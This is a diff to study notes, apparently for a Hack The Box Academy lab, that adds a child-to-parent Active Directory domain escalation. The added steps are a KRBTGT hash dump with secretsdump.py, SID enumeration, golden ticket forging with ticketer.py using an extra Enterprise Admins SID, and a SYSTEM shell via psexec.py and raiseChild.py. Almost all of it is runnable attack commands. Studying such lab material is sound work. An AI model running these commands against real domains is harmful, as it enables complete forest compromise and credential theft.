@@ -495,16 +495,33 @@ lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 >
 >Name of target user (can be fake) 
 >
->FDQN of child domain (X.INLANEFREIGHT.LOCAL) 
+>FDQN of child domain (X.INLANEFREIGHT.LOCAL) (already known) 
 >
 >SID of Enterprise Admins group of root domain
 
+**1.KRBTGT Hash**
 ```
 secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 ```
-
+**2.SID brute forcing to find SID of child domain and enterprise admin**
 ```
 lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID" 
 ```
+```
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+```
+**Golden Ticket Creation**
+```
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
 
-  
+export KRB5CCNAME=hacker.ccache #file used to hold kerberos credentials, referenced 
+```
+
+**Getting System Shell**
+```
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+
+```
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+```
